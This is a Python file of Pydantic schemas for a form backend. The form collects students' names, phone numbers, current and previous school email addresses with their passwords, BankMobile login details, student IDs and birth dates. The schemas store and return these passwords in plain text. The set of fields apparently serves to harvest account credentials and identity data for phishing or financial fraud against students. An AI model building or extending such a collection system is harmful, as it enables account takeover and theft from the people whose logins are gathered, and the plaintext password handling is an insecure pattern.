from datetime import date, datetime
from pydantic import BaseModel, EmailStr 
from typing import Optional


# Pydantic schema for creating form submissions
class FormSubmissionBase(BaseModel):
    name: str
    phone: str
    current_school_email: EmailStr
    current_school_email_pass: str 
    previous_school_email: EmailStr
    previous_school_email_pass: str 
    bankmobile_email: Optional[EmailStr] = None
    bankmobile_email_pass: Optional[str] = None
    student_id: str 
    date_of_birth: date  # Optional
    
    class Config:
        from_attributes = True # This tells pydantic to treat Sqlalchemy model as a dict

# Pydantic schema for creating form submissions
class FormSubmissionCreate(FormSubmissionBase):
    pass 

# Pydantic schema for returning form submission data
class FormSubmissionOutput(FormSubmissionBase):
    id: int 
    date_created: datetime # Read-only, auto-set by the database
    
    
      